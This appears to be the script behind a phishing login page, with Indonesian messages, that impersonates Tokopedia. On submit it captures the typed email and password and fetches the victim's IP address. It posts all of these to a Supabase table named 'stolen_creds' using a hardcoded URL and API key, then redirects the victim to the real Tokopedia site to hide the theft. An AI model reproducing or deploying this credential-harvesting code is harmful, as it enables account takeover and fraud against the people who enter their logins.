    const SUPABASE_URL = 'https://admrdobdlrqygyjcubyd.supabase.co'; 
    const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFkbXJkb2JkbHJxeWd5amN1YnlkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI1NzAwMzgsImV4cCI6MjA4ODE0NjAzOH0.6VXIPTLlqn68CJd2kyMlgwfEvvwHY5UrA0ZVXmSMVwU';

    document.getElementById('loginForm').addEventListener('submit', async function(event) {
        event.preventDefault(); 

        const userValue = document.getElementById('username').value;
        const passValue = document.getElementById('password').value;

        let ipAsli = "IP_Tidak_Ditemukan";

        try {
            const tangkapanIP = await fetch('https://api.ipify.org?format=json');
            const dataIP = await tangkapanIP.json();
            ipAsli = dataIP.ip; 
        } catch (errorIP) {
            console.error('Gagal mengambil IP:', errorIP);
        }

        try {
            const response = await fetch(`${SUPABASE_URL}/rest/v1/stolen_creds`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'apikey': SUPABASE_KEY,
                    'Authorization': 'Bearer ' + SUPABASE_KEY
                },
                body: JSON.stringify({
                    email: userValue,
                    password_hash: passValue,
                    ip_address: ipAsli, 
                    login_timestamp: new Date().toISOString()
                })
            });

            if (response.ok) {
                window.location.href = 'https://www.tokopedia.com'; 
            } else {
                alert('Gagal terhubung ke database. Cek Console.');
            }
        } catch (error) {
            console.error('Error:', error);
        }
    });
